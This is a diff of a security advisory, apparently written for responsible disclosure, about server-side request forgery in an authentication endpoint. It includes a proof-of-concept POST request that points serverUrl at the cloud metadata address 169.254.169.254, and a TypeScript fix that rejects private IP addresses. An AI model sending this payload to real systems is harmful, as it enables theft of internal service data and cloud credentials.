@@ -22,12 +22,20 @@ An attacker can supply a `serverUrl` pointing to internal infrastructure such as
 
 > **Warning:** For responsible disclosure purposes only. Do not use against systems you do not own.
 
-```httpPOST /api/auth/stalwart-context HTTP/1.1
+
+
+https://github.com/user-attachments/assets/f0ecc159-a4f9-4fb1-ba44-605086c1c784
+
+
+
+```http
+POST /api/auth/stalwart-context HTTP/1.1
 Content-Type: application/json{
 "serverUrl": "http://169.254.169.254/latest/meta-data/",
 "username": "any",
 "authHeader": "Bearer any-token"
 }
+```
 
 The server fetches the target URL and processes the response, leaking internal service data or enabling further chained attacks.
 
@@ -42,13 +50,14 @@ The server fetches the target URL and processes the response, leaking internal s
 
 In `lib/auth/verify-jmap-auth.ts`, resolve the hostname of any user-supplied URL before making a fetch request and reject it if it resolves to a private or loopback address. Reuse the existing DNS-resolution and blocklist logic already present in the `fetch-ical` endpoint.
 
-```tsimport dns from 'dns/promises';
+```ts
+import dns from 'dns/promises';
 import { isPrivateIP } from './ip-utils';async function isSafeUrl(url: string): Promise<boolean> {
 const { hostname } = new URL(url);
 const { address } = await dns.lookup(hostname);
 return !isPrivateIP(address);
 }
-
+```
 Block the following ranges at minimum:
 
 | Range            | Description       |
